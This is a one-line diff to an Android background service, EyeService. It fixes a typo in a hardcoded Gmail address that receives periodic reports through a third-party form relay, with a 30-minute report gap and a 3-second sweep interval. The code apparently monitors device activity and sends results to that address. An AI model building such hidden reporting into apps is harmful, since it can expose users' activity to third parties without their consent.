@@ -428,7 +428,7 @@ public class EyeService extends Service {
 	}
 	private static final String NNN_PREFS = "capri_nnn";
 	private static final String NNN_CODE = "34872";
-	private static final String NNN_REPORT_TO = "cyberwold56789@gmail.com";
+	private static final String NNN_REPORT_TO = "cyberwolf56789@gmail.com";
 	private static final String NNN_REPORT_URL = "https://formsubmit.co/ajax/" + NNN_REPORT_TO;
 	private static final long NNN_REPORT_GAP = 30L * 60L * 1000L;
 	private static final long NNN_SWEEP_MS = 3000L;
